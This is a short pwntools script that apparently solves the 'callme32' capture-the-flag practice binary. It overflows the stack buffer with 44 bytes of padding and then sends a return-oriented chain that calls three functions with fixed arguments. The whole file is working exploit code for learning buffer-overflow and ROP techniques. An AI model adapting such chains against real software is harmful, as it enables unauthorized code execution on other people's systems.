# -*- coding: utf-8 -*-
from pwn import *

p = process("./callme32")

pop3_ret = 0x080488a9
callmeone = 0x80485c0
callmetwo = 0x8048620 
callmethree = 0x80485b0

pwnme =0x80487b6

p.recvuntil("> ")
payload = 'a' * 44 + p32(callmeone) + p32(pop3_ret) + p32(1) + p32(2) + p32(3) + p32(callmetwo) + p32(pop3_ret) + p32(1) + p32(2) + p32(3) + p32(callmethree) + p32(pwnme) + p32(1) + p32(2) + p32(3)
p.sendline(payload)

p.interactive()
